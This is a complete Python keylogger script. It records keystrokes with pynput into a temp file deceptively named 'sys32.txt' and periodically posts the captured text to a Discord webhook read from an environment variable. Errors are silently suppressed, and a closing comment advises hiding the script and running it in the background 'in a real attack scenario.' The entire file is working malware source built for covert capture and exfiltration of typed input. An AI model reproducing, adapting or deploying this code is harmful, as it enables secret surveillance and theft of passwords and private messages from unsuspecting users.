from pynput import keyboard
import os
import tempfile
import requests 
from dotenv import load_dotenv

load_dotenv()
Webhook_URL = os.getenv("Webhook_URL")

LOG_FILE = os.path.join(tempfile.gettempdir(), "sys32.txt") 
MAX_BUFFER = 100

def send_to_discord():
    if not Webhook_URL or not os.path.exists(LOG_FILE):
        return
    
    try:
        with open(LOG_FILE, "r") as f:
            data = f.read()
        
        if data.strip():
            payload = {"content": f"```{data}```"}
            response = requests.post(Webhook_URL, json=payload)
            if response.status_code in [200, 204]:
                open(LOG_FILE, "w").close()  # Clear the log file after sending
    except Exception: 
        pass 

def write2File(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False
    
    keydata = str(key)
    keydata = keydata.replace("'", "")
    
    if keydata == "Key.space":
        keydata = " "
    elif keydata == "Key.enter":
        keydata = "\n"
    elif keydata == "Key.tab":
        keydata = "\t"
    elif "Key" in keydata:
        return # Ignore other special keys

    with open(LOG_FILE, "a") as f:
        f.write(keydata)

    # Buffer keystrokes, send to Discord every 100 words
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) >= MAX_BUFFER:
        send_to_discord()

def start_keylogger():
    if os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()  # Clear the log file at the start
    with keyboard.Listener(on_press=write2File) as l:
        l.join()

if __name__ == "__main__":
    start_keylogger() # for testing purposes, you can run this script directly. In a real attack scenario, you would want to hide this script and run it in the background.